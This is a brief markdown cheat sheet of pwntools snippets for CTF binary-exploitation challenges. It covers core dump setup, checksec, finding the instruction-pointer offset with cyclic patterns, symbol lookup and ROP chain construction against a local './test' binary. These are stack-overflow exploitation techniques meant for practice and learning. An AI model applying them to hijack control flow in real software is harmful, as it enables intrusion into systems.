# PwnChalenges
## Coredump
```
ulimit -c unlimited
echo '/tmp/core.%e.%p' | sudo tee /proc/sys/kernel/core_pattern
```
## Checksec
```
exe = './test'
elf = context.binary = ELF(exe, checksec=True)
context.log_level = 'debug'
```
## EIP/RIP offset 
```
def findoffset(path,size,after):
    #target=process(path, stdin=PTY, stdout=PTY, stderr=PTY)
    target=process(path)
    target.sendlineafter(after, cyclic(size))
    target.wait()
    # ip_offset = cyclic_find(p.corefile.pc)  # x86
    ip_offset = cyclic_find(target.corefile.rbp)+8 # x64
    info('located EIP/RIP offset at {a}'.format(a=ip_offset))
    return ip_offset
```
## Function Address
```
info(hex(elf.symbols['gg']))
```
## ROP chains
```
exe = './test'
elf = context.binary = ELF(exe, checksec=True)
rop = ROP(elf)
#Write a ret gadget to avoid stack alignment issues.In x86-64 (64-bit) systems, the System V AMD64 ABI specifies a requirement for stack alignment: before a function call, the stack pointer (rsp) must be 16-byte aligned. If this alignment is violated, it can cause crashes or undefined behavior, especially for functions that use instructions like movaps, which assume aligned memory.
rop.raw(rop.find_gadget(['ret'])[0])
rop.function(arg1,arg2,arg3)
info(rop.dump())
info(rop.chain())
```

